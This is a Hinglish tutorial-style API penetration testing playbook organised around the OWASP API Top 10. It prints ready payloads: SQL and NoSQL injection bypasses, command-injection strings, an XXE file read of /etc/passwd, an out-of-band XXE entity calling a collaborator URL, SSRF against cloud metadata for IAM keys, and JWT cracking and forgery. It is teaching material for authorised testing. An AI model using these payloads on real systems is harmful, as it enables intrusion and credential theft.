# 📘 The Ultimate Industry-Standard API Hacking Playbook (100% Complete)
**Author:** Senior API Security Researcher & Pentesting Mentor (10+ Yrs Exp)
**Language:** Hinglish (Roman) for explanations, English for Tech
**Target:** OWASP API Top 10 2023 | Real-world Corporate Pentesting | Bug Bounty

---

## 🧩 Module 0: API Hacking Mindset & Methodology
*Sabse pehle, mindset theek karo. API testing sirf "click next" nahi hai, ye ek game of logic hai.*

* **API vs Web App:** Web apps user interactions ke liye banti hain (UI ke saath), APIs sirf machine-to-machine communication ke liye (JSON/XML). Isliye APIs mein UI nahi hota, sirf logic hota hai.
* **Attack Surface Samjho:** Ek API endpoint ek function ki tarah hai. Har function (GET, POST, PUT, DELETE) alag behavior dikha sakta hai.
* **Rule #1:** Kabhi bhi server ke response par bharosa mat karo. Frontend jo dikha raha hai, wo alag ho sakta hai, backend jo bhej raha hai wo alag.
* **Rule #2:** API testing = Logic testing. Har flow ko todne ki koshish karo.

---

## 🔍 Module 1: Reconnaissance & Advanced Discovery
*Target ki "Jaikaashi" karna. Jitna jaayega jaanoge, utna deep jaayega exploit.*

### Topic 1.1: Passive Recon (Bina Touch Kiye)
* **Technology Stack Detection:**
    * **Tool 1: Wappalyzer** (Browser Extension) -> Bataega ki website kis pe bani hai (PHP, Node.js, React, etc.). Isse pata chalega ki SQLi try karna hai ki NoSQLi.
    * **Tool 2: BuiltWith** (Online Tool) -> Detailed tech profile. (Reference: **Page 12**)
* **Source Code Analysis (JS Mining):**
    * Website par right-click -> **Inspect Element (Debugger)** . (Reference: **Page 6**)
    * Saari JavaScript files (`.js`) scroll karo. Minified (read nahi aa raha) code ho, toh use **"JavaScript JS Formatter"** (online tool) mein daal kar beautify karo. (Reference: **Page 6**)
    * **Dhoondo kya dhoondo:**
        * `/api/`, `/v1/`, `/graphql`, `/swagger` jaise paths.
        * Hardcoded API keys, secrets, ya endpoints comments mein.
        * **Pro Tip:** `LinkFinder` ya `JSScanner` jaise tools automate kar dete hain JS se endpoints nikalna.

### Topic 1.2: Active Recon (Mapping the Territory)
* **Directory/File Fuzzing (Basic):** `gobuster` ya `ffuf` use karo.
* **API-Specific Fuzzing (Advanced):** Normal wordlists API ke liye kaam nahi karti. **Kiterunner** (context-aware fuzzer) use karo jo API routes (`/api/users/export`) aur common API wordlists ke saath aata hai. (Reference: **Page 6 - Fuzzing APIs**)
* **Hidden Parameter Discovery:** **Arjun** ya Burp ka **Param Miner** use karke hidden headers (jaise `X-Forwarded-For`, `X-Admin-User`, `X-Original-URL`) dhoondna.
* **Documentation Mining (Sone ki chidiya):**
    * Ye endpoints dhoondo: `/swagger-ui.html`, `/swagger.json`, `/v2/api-docs`, `/openapi.json`, `/redoc`, `/graphql?introspection`. (Reference: **Missing Topics**)
    * Agar mil gaya, toh poora API ka map (endpoints, parameters, authentication) mil jayega.
* **Improper Assets Management (OWASP API 9:2023) Deep Dive:**
    * **Shadow APIs:** Wo endpoints jo production mein hain par developer bhool gaye (e.g., `/api/v1.1/` jab `/v2/` chal raha ho). Inhe dhoondo fuzzing se.
    * **Environment Leakage:** Production API ke parameters use karke `dev`, `staging`, ya `test` environment ka data access karna (e.g., changing `origin=prod` to `origin=dev`). Try karo `Host: dev-api.target.com` header change karke.
    * **Unauthenticated Docs:** Kya Swagger/Redoc UI bina login ke accessible hai? Isse poora map mil jata hai.
    * **Host Header Injection:** Request mein `Host` header change karke dekho (`Host: evil.com`). Kya server internal redirect kar raha hai ya cache poison ho raha hai?

### Topic 1.3: Version Control & Leak Search
* **GitHub/GitLab Dorks:** "target.com API key", "target.com secret", "target.com token" search karo. Internal docs bhi mil sakte hain.
* **Mobile App Decompilation:** APK download karo, `apktool` ya `jadx` se decompile karo. `strings.xml` aur source code mein hardcoded API keys dhoondo.

---

## 🔐 Module 2: Authentication & Session Management Deep-Dive
*Andar ka raasta (gateway) kitna strong hai?*

### Topic 2.1: Response Manipulation (Login Bypass)
* **Scenario:** Kya frontend sirf server ke status code ke bharose baitha hai? (Reference: **Page 1-4**)
* **Method (Burp Suite):**
    1.  Correct credentials daal kar request intercept karo. Server se response aayega (e.g., `200 OK` with token).
    2.  Response ko browser tak forward karne se pehle, status code change karo `200 OK` se `403 Forbidden` kar do, lekin response body mein token wahi rahne do. (Reference: **Page 2-3**)
    3.  **Observation:** Agar browser error dikhata hai ("Unauthorized"), iska matlab frontend **sirf Status Code** check kar raha hai.
    4.  **Exploit:** Ab wrong credentials dalo, server se `403` aayega. Use intercept karo, status code `200 OK` kar do, aur forward kar do. Agar app login ho jati hai, toh **Critical Vulnerability**! (Reference: **Page 3**)
* **Verification (Grep-Match Method):** (Reference: **Page 4**)
    * Agar correct/wrong credentials ka response body same hai, toh Intruder mein "Grep-Match" use karo.
    * Intruder -> Options -> Grep-Match -> Add `"success":true` ya `"status":1` (jo bhi success flag ho). Ye highlight karega successful attempts ko.

### Topic 2.2: No-Rate Limit Attacks
* **Scenario:** Password reset, OTP, ya login attempts par koi limit nahi hai. (Reference: **Page 18**)
* **Exploit:**
    * Burp Intruder (ya Python script) se ek email/phone par 1000 OTP requests bhej do.
    * **Impact:** User ka inbox blast ho jayega (DoS) ya brute-force ke chances badh jayenge.
* **Fix:** Rate limiting (1-2 per minute) + Captcha.

### Topic 2.3: Clickjacking (Session Riding)
* **Scenario:** User apne session ka fayda utha kar anjaane mein action kar de. (Reference: **Page 18-19**)
* **Method:**
    * Hacker ek fake page banata hai (e.g., "Win a Prize" button). Is button ke peeche ek transparent iframe mein target website ka sensitive button (e.g., "Delete Account") hota hai.
    * User click karta hai, actually wo "Delete Account" par click kar deta hai, kyunki wo already logged-in hai.
* **Test:** Burp Suite mein kisi bhi response par right-click -> **"Check for Clickjacking"** .

### Topic 2.4: Session Security
* **Session ID Static Hai Kya?** (Reference: **Page 19**)
    * Login se pehle jo cookie milti hai (`PHPSESSID`) aur login ke baad wali cookie, check karo. Kya wo same hai?
    * **Risk:** Agar login ke baad bhi session ID change nahi hoti, toh hacker ye ID chura kar (XSS ya phishing se) kabhi bhi account mein ghus sakta hai bina password ke. Isse **Session Fixation** kehte hain.
* **Refresh Token Rotation:** Check karo ki jab naya access token liya jata hai, to purana refresh token invalid ho jata hai ya nahi.
* **Concurrent Sessions:** Kya same user do alag browsers se login kar sakta hai? Kitni active sessions allowed hain?

### Topic 2.5: JWT (JSON Web Tokens) Deep-Dive (Reference: **Page 7-9**)

#### Sub-Topic: JWT Structure
* `ey... . ey... . xxA...` -> Teen parts: **Header.Payload.Signature**
* **Header:** Algorithm batao (e.g., `HS256`, `RS256`).
* **Payload:** User data (e.g., `"user": "sat"`, `"admin": false`).
* **Signature:** Secret key se sign kiya gaya hash. (Reference: **Page 7**)
* **Tool:** `jwt.io` par paste karo, decoded dikh jayega. (Reference: **Page 7**)

#### Sub-Topic: Attacking JWT
* **1. Hashcat (Brute-force HS256):**
    * Agar secret key weak hai (e.g., `secret`, `password`), toh use crack karo.
    * `hashcat -m 16500 <jwt_token> /path/wordlist.txt --show` (Reference: **Page 8-9**)
    * `-m 16500` = HS256. HS384 ke liye `16510`, HS512 ke liye `16520`.
* **2. Algorithm Confusion (RS256 -> HS256):**
    * **Scenario:** Server RS256 (private/public key) use kar raha hai, lekin humein public key pata hai (usually `.well-known/jwks.json` se mil jati hai).
    * **Attack:** Hum header mein algorithm `HS256` kar dete hain aur public key ko HMAC secret ki tarah use karte hain. Token sign kar dete hain. Agar server public key se verify karta hai (jo ki ab secret ban gaya), toh accept ho jayega. (Reference: **Missing Topics**)
* **3. None Algorithm Attack:**
    * Header ko `"alg": "none"` kar do aur signature part hata do. Purani libraries mein kaam karta tha. (Reference: **Missing Topics**)
* **4. `kid` (Key ID) Injection:**
    * Header mein `kid` parameter hota hai. Ismein path traversal daal do (`"kid": "../../dev/null"`) ya SQLi (`"kid": "key' UNION SELECT 'secret'"`). Agar server ise read karta hai bina validate kiye, toh signature bypass ho sakta hai.
* **5. `jku` / `x5u` Header Injection:**
    * `jku` (JWKS URL) header mein apne server ka URL daal do jahan aapne apni public key rakhi ho. Server wahan se key utha lega aur aap jo bhi sign karoge, wo valid ho jayega.
* **6. JTI Replay Attack:**
    * `jti` (JWT ID) claim check hota hai ki nahi? Agar nahi, toh same token baar-baar use karo.
* **7. Timing Attacks:**
    * Valid aur invalid signature verify karne mein server different time le raha hai? Isse brute-force fast ho sakta hai.

#### Sub-Topic: OAuth 2.0 / OIDC Flows
* **Redirect URI Manipulation:** OAuth flow mein `redirect_uri` parameter ko change karke apne malicious site par bhej do. Agar open redirect hai, toh authorization code steal kar sakte ho.
* **State Parameter Missing:** Agar `state` parameter missing hai, toh CSRF attack ho sakta hai. Attacker apni link bhej kar user ke account ko link kar sakta hai.
* **Token Leakage:** Access token kabhi URL mein mat aane do (`#access_token=`). Referer header se leak ho sakta hai.

---

## 🔑 Module 3: Authorization (BOLA, BPLA, BFLA)
*Andar aane ke baad, kya kya kar sakte ho?*

### Topic 3.1: BOLA / IDOR (Broken Object Level Authorization)
* **Classic IDOR:** `GET /api/users/123` ko change karo `456`. Agar dusre user ka data mil gaya, BOLA hai. (Reference: **Page 7**)
* **BOLA Attack Flow (Visual Samjho):**
    1.  **Attacker:** Apni valid request intercept karta hai: `GET /api/v1/my-profile?id=attacker_id`.
    2.  **Manipulation:** `id` ko change karta hai: `id=victim_id`.
    3.  **Server Error:** Server check karta hai "Token valid hai?" (Yes), lekin "Kya ye user is ID ka owner hai?" ye check karna bhool jata hai.
    4.  **Data Leak:** Attacker ko victim ka private JSON mil jata hai.
* **Negative IDs:** `GET /api/users/-1` dekh kar dekho. Error message mein database ka info leak ho sakta hai. (Reference: **Page 7**)
* **Bulk BOLA:** Kya API ek array accept karti hai? `POST /api/users/get` with body `{"ids": [123,124,125]}`. Agar saare users ka data dump kar diya, wo massive BOLA hai.
* **UUID/GUID Brute-forcing:** Agar IDs `user-873hjd8` jaise hain, toh predictable nahi hain. Par kya wo kisi aur jagah leak ho rahe hain? (e.g., Referer header, logs, search results mein, ya JS files mein).
* **Chained BOLA:** Pehle ek IDOR se dusre user ki ID leak karo, fir us ID se uske private data access karo.
* **BOLA in Non-CRUD Operations:** Sirf GET/POST mein nahi, balki `DELETE /api/user/123`, `PUT /api/user/123/password` jaisi actions mein bhi try karo.
* **BOLA via API Versioning:** `/v2/user/my-info` secure hai, lekin kya `/v1/user/other-id` vulnerable hai? Version downgrade attacks try karo.
* **BOLA in Password Reset:** Reset link mein `user_id` ya `email` change karke kisi aur ka password reset kar dena.

### Topic 3.2: BPLA / Mass Assignment (Broken Property Level Authorization)
* **Hidden Properties:** Request mein extra properties bhej kar dekho. (Reference: **Page 15 - Mass Assignment**)
    * `POST /api/user/update` with body `{"name":"sat", "isAdmin":true}`.
    * `role: "superuser"`, `balance: 99999`, `verified: true`, `email_verified: true`.
* **Nested JSON Manipulation:** Agar JSON nested hai, toh andar ki properties bhi change karo.
    ```json
    {
      "user": {
        "name": "sat",
        "settings": {
          "isAdmin": true
        }
      }
    }
    ```
* **Excessive Data Exposure:** Response mein sensitive fields dhoondo jo frontend ko nahi dikh rahe hain. Jaise server bhej raha hai `"mobile": "9876543210"` lekin UI mein sirf last 4 digits dikha raha hai. Iska matlab data leak ho raha hai.
* **HTTP Verb Tampering:** Pata karo ki kaunse methods allowed hain. (Reference: **Page 15**)
    * Intruder mein HTTP verbs (`GET, POST, PUT, DELETE, PATCH, OPTIONS`) daal kar fuzz karo.
    * Agar kisi endpoint par `POST` allowed nahi hona chahiye par milta hai (`200 OK`), toh wo method enabled hai. Ab us method se attack karo.

### Topic 3.3: BFLA (Broken Function Level Authorization)
* **Admin Endpoint Access:** `/api/admin/users`, `/api/admin/delete` jaise endpoints ko low-privilege user se access karne ki koshish karo.
* **Method Tampering:** Agar `GET /api/admin/users` blocked hai, toh `POST /api/admin/users` ya `PUT` try karo.

---

## 💉 Module 4: Modern Injections & Resource Abuse (SQL, NoSQL, SSRF, XXE, Unrestricted Consumption)

### Topic 4.1: SQL Injection
* **Fuzzing Approach:** (Reference: **Page 10-11**)
    * Request ko Intruder mein bhejo. Parameter ke aage `$1$` mark karo.
    * Payloads mein se **"Fuzzing - SQL Injection"** select karo.
    * Attack karo aur status code/length mein change dhoondo.
* **Manual Exploitation:**
    * Agar `id=5` vulnerable hai, toh `UNION SELECT` try karo:
    * `GET /v1/001.php?id=5+UNION+SELECT+username,password,null,null+from+users--` (Reference: **Page 11**)
* **Second-order SQLi:** Pehle payload database mein store karwao (e.g., signup mein `' OR 1=1;--` username se), aur baad mein kisi dusre feature mein use trigger karo.

### Topic 4.2: NoSQL Injection (MongoDB)
* **Tech Detection:** (Reference: **Page 11-12**)
    * Error message mein `MongoError`, `E11000` dhoondo.
    * Response mein `_id`, `ObjectId` dhoondo.
* **Authentication Bypass (Boolean-based):** (Reference: **Page 12-13**)
    * **Original Query:** `db.users.find({"username": username, "password": password})`
    * **Payload:**
        * Username: `admin`
        * Password: `{"$ne": null}`
    * **Final Query:** `db.users.find({"username": "admin", "password": {"$ne": null}})`
    * Matlab "jiska username admin ho aur password null na ho". Ye hamesha true hai. Bypass!
* **Bypass both fields:** (Reference: **Page 13**)
    * `username: {"$exists": true}, password: {"$ne": null}`
* **Command Injection:** (Reference: **Page 14**)
    * `$gt`: greater than. `username: {"$gt": ""}` -> Saare users jinka username empty string se bada hai (practically sabhi).
    * `$where`: JavaScript execute karo. `username: {"$where": "this.username == 'admin'"}`. Ismein sleep payloads bhi daal sakte ho: `{"$where": "sleep(5000)"}`.
* **Blind NoSQLi:** Response time ya error based conditions se data extract karo.

### Topic 4.3: SSRF (Server-Side Request Forgery)
* **Kaha dhoondo:** Endpoints jo URL accept karte hain (e.g., `?image_url=...`, `webhook=...`, `?file=...`, `?url=...`, `?path=...`).
* **Payloads:**
    * Internal cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS) ya `http://metadata.google.internal/` (GCP). Isse IAM credentials mil sakte hain.
    * Internal services: `http://localhost:8080/`, `http://127.0.0.1/health`, `http://192.168.1.1/admin`.
    * Port scan: `http://localhost:22`, `http://localhost:3306`.
* **Blind SSRF:** Agar response mein data nahi dikhta, toh Burp Collaborator ya `https://webhook.site` use karo. Apna URL bhejo aur dekho ki server ne request ki ya nahi.
* **Webhook SSRF:** Webhook URL field mein apna collaborator URL daalo.

### Topic 4.4: XXE (XML External Entity)
* **Kaha dhoondo:** APIs jo `Content-Type: application/xml` accept karti hain ya `Content-Type: application/json` ke saath bhi XML data accept kar leti hain.
* **Payload (File Read):**
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <product>&xxe;</product>
    ```
* **Blind XXE:** Out-of-band data exfiltration.
    ```xml
    <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe;]>
    ```

### Topic 4.5: Command Injection
* **Kaha dhoondo:** Endpoints jo system commands ki tarah behave karte hain (e.g., `?host=google.com`, `?ip=8.8.8.8`, `?file=test.pdf`).
* **Payloads:**
    * `; ls -la`
    * `| whoami`
    * `$(id)`
    * `` `id` ``
    * `|| ping -c 10 127.0.0.1`

### Topic 4.6: SSTI (Server-Side Template Injection)
* **Kaha dhoondo:** Response mein user input reflect ho raha ho, especially error messages ya profile pages mein.
* **Payloads:** `{{7*7}}`, `${7*7}`, `{{7*'7'}}`. Agar response mein `49` ya `7777777` dikhe, toh SSTI hai.
* **RCE:** Fir template engine ke hisaab se RCE payloads daalo (Jinja2, Freemarker, etc.).

### Topic 4.7: Unrestricted Resource Consumption (OWASP API 4:2023)
* **Pagination Abuse:**
    * Endpoint: `GET /api/products?limit=10` ko change karo `limit=1000000` ya `limit=999999999`.
    * Agar server saare products ek saath bhejne ki koshish karta hai, toh memory exhaust ho sakti hai (DoS).
* **Large Payloads:**
    * JSON body mein 10MB ka random string bhejo. Agar server parse karne ki koshish karega, CPU usage high ho jayega.
* **Array Overflow:** JSON array mein 1 lakh objects bhej do `[{"id":1}, {"id":2}, ...]`.
* **Rate Limit Bypass:** (Iska detail **Module 5** mein hai, par yahan bhi mention kar do ki resource consumption se bhi DoS ho sakta hai).

---

## 🚀 Module 5: GraphQL Security (Modern APIs)

### Topic 5.1: GraphQL Discovery
* Endpoints: `/graphql`, `/graphiql`, `/playground`, `/v1/graphql`.
* **Introspection Query:** GraphQL endpoint ka poora schema nikal lo. Ye sabse pehla step hai.
    ```graphql
    query {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              kind
            }
          }
        }
      }
    }
    ```
    Agar introspection off hai, toh **field suggestions** se bhi hints mil sakte hain. Galat field name likho to suggestion mein correct field name aa sakta hai.

### Topic 5.2: GraphQL Attacks
* **Batching Attack:** Ek request mein 100+ queries bhej kar rate limit bypass aur resource exhaustion.
    ```graphql
    query q1 { user(id:1) { name } }
    query q2 { user(id:2) { name } }
    # ... up to 100 queries
    ```
* **Deep Recursion (Cyclical Queries):** Aisi query bhejo ki database crash ho jaye.
    ```graphql
    query {
      user {
        friends {
          user {
            friends {
              user {
                friends {
                  name
                }
              }
            }
          }
        }
      }
    }
    ```
* **Directive-based Attacks:** `@include` aur `@skip` directives ko manipulate karke condition bypass karna.
* **GraphQL IDOR:** Predictable global IDs ka use karke dusre objects access karna.

---

## 🔄 Module 6: Business Logic & Rate Limiting

### Topic 6.1: Workflow Bypass
* **Scenario:** Signup process -> (1) Register (2) Verify OTP (3) Success.
* **Attack:** Step 1 complete karne ke baad, seedha Step 3 ka endpoint call karo (`/api/success`). Agar skip kar diya, vulnerable hai.
* **Force Browsing:** Step 2 ke baad Step 3 ka URL guess karo.

### Topic 6.2: Race Conditions (Turbo Intruder)
* **Scenario:** Coupon code ek baar use ho sakta hai. Ek hi second mein 50 requests bhej do us coupon ke saath. Agar 2 baar apply ho gaya, Race Condition hai.
* **Scenario:** Wallet mein se paisa nikalna. Balance check hone aur deduct hone ke beech mein multiple requests bhejo.
* **Tool:** Burp Suite ka **Turbo Intruder** extension.
    * Python script likho jo 50+ concurrent requests bheje.

### Topic 6.3: Rate Limiting Bypass
* **IP Rotation:**
    * `X-Forwarded-For: <random IP>` header rotate karo. Burp mein `FoxyProxy` ya custom script use karo.
    * VPN ya proxy chains use karo.
* **Parameter Pollution:** Har request mein ek extra random parameter daal do (`&rand=123`, `&rand=456`). Isse server ki fingerprinting fail ho sakti hai.
* **Endpoint Swapping:** Agar `/api/login` par rate limit hai, toh `/api/v2/login` ya `/api/auth/login` try karo.
* **Slow down:** Thoda slow request bhejo, threshold ke neeche raho.

### Topic 6.4: Financial Logic Flaws
* **Negative Values:** `quantity: -1` ya `price: -100` bhej kar dekho. Total negative ho sakta hai.
* **Currency Manipulation:** Product price USD 10 hai. Currency code change karo INR 10 par. Agar conversion nahi hua, toh sasta mil gaya.
* **Decimal Precision:** `price: 10.9999999999` bhej kar rounding errors exploit karo.

---

## 🌐 Module 7: Infrastructure & Misconfiguration (Mobile & Cloud)

### Topic 7.1: Mobile API Interception (SSL Pinning Bypass)
* **Problem:** Mobile app mein Burp ka certificate kaam nahi karta (app apna certificate check karti hai).
* **Solution 1 (Objection/Frida):**
    * Install Frida and Objection.
    * `objection --gadget "app.name" explore --startup-command "android sslpinning disable"`
* **Solution 2 (Burp + Proxy):** Android emulator mein proxy set karo aur `ProxyDroid` jaise app se traffic forward karo.
* **Hardcoded Keys:** APK decompile karo (`apktool`), `strings.xml` aur source code mein API secrets, Firebase keys, aur endpoints dhoondo.

### Topic 7.2: Cloud-Native API Risks (AWS/Azure/GCP)
* **Metadata SSRF:** SSRF se `http://169.254.169.254/latest/meta-data/iam/security-credentials/` hit karo. Temporary AWS keys mil jayenge.
* **S3 Bucket Leakage:** API endpoints jo files serve karte hain, unmein S3 URLs leak ho rahe hain? Response mein `https://s3.amazonaws.com/bucket-name/file.jpg` dikhta hai toh bucket public ho sakti hai.
* **Serverless (Lambda) Risks:** Event injection. Manipulated JSON event se lambda function ka logic change kar do.

### Topic 7.3: CORS (Cross-Origin Resource Sharing) Misconfiguration
* **CORS Wildcard:** `Access-Control-Allow-Origin: *` ke saath `Access-Control-Allow-Credentials: true` ho toh **critical** hai. Koi bhi malicious site user ka data API se chura sakti hai.
    * **Test:** Request mein `Origin: https://evil.com` daalo. Agar response mein `Access-Control-Allow-Origin: https://evil.com` aur `Allow-Credentials: true` milta hai, toh vulnerable.
* **Null Origin Bypass:** `Origin: null` bhej kar dekho. Kai baar server `null` ko allow kar deta hai.
* **Preflight Bypass:** `OPTIONS` request ka response check karo.

### Topic 7.4: API Versioning & Deprecation
* **Debug Endpoints:** `/api/debug`, `/api/test`, `/api/health`, `/api/status` try karo. Production mein ye nahi hone chahiye.
* **Deprecated Versions:** `/v1/` mein vulnerabilities hain jo `/v2/` mein fix hain. Try karo `/v1/` endpoints ko.

### Topic 7.5: Security Headers
* Check karo: `Strict-Transport-Security` (HSTS), `Content-Security-Policy` (CSP), `X-Content-Type-Options` present hain ya nahi.
* **Verbose Error Messages:** Galat input daal kar dekho. Stack trace, DB version, internal paths leak ho rahe hain?

---

## 🔗 Module 8: Webhook Security & Microservices

### Topic 8.1: Webhook Security
* **Scenario:** Tumhari app kisi third-party service ko webhook bhejti hai (e.g., payment success par).
* **Lack of Signature Verification:** Agar incoming webhook (dusri service se tumhari app par aane wala) verify nahi hota, toh attacker fake webhook bhej kar event trigger kar sakta hai (e.g., "payment success").
* **Replay Attacks:** Webhook request mein `timestamp` aur `nonce` missing hai? Attacker same request baar-baar bhej sakta hai.
* **SSRF via Webhook:** Webhook URL field mein internal IP daal kar server ko request karwado.

### Topic 8.2: Microservices Communication
* **Service-to-Service Auth:** Internal APIs bina authentication ke accessible hain? Try karo `service-a.internal` ya `service-b:8080` ko.
* **mTLS Misconfig:** Agar mutual TLS hai, toh certificate check bypass ho sakta hai?

---

## ⚙️ Module 9: Professional Tooling & Automation

### Topic 9.1: Burp Suite Mastery
* **Scope Configuration:** Sirf target domain ka traffic dekhne ke liye (Reference: **Page 5, 16-17**)
    1.  Target tab -> Scope -> Add domain.
    2.  Proxy -> HTTP History -> Filter -> "Show only in-scope items".
* **Color Coding:** Kisi bhi request par right-click -> "Add to scope/Highlight" kar ke important requests ko mark karo. (Reference: **Page 4**)
* **Intercept Response Rules:** Settings mein "Intercept response based on rules" enable karo. (Reference: **Page 17**)

### Topic 9.2: Burp Extensions (Must-Haves)
* **Autorize:** Automated authorization testing (BOLA dhoondne ke liye). Low-privilege user ke session ke saath chalao, high-privilege endpoints access ho rahe hain kya?
* **AuthMatrix:** Complex role-based access control (RBAC) test karne ke liye.
* **JSON Web Tokens:** JWT ko intercept karte hi edit karne ke liye.
* **GraphQL Raider / InQL:** GraphQL testing ke liye.
* **Turbo Intruder:** Race conditions aur massive rate limit testing.
* **Backslash Powered Scanner:** Advanced parameter parsing.
* **Logger++:** Advanced traffic logging.

### Topic 9.3: CLI & Scripting
* **Postman / Newman:** API collections bana kar Newman se automate karo. Regression testing ke liye useful.
* **Python Requests:** Custom scripts for complex logic attacks (Race conditions, custom payloads).
* **Nuclei:** API-specific templates se automatic CVE scan karna. `nuclei -u https://api.target.com -t ~/nuclei-templates/api/`
* **Ffuf / Gobuster:** API route discovery ke liye custom API wordlists ke saath.

### Topic 9.4: Reporting (CVSS & PoC)
* **CVSS Score:** Vulnerbility ki severity nikalne ke liye (Base Score: 3.0 - Low, 7.0+ High). Use `https://www.first.org/cvss/calculator/`.
* **PoC Writing:** Steps clearly likho, screenshot do, impact batao, fix suggestion do.
* **Remediation Guidance:** Framework-specific fix suggestions (e.g., Spring Boot mein `@PreAuthorize`, Express mein middleware).

---


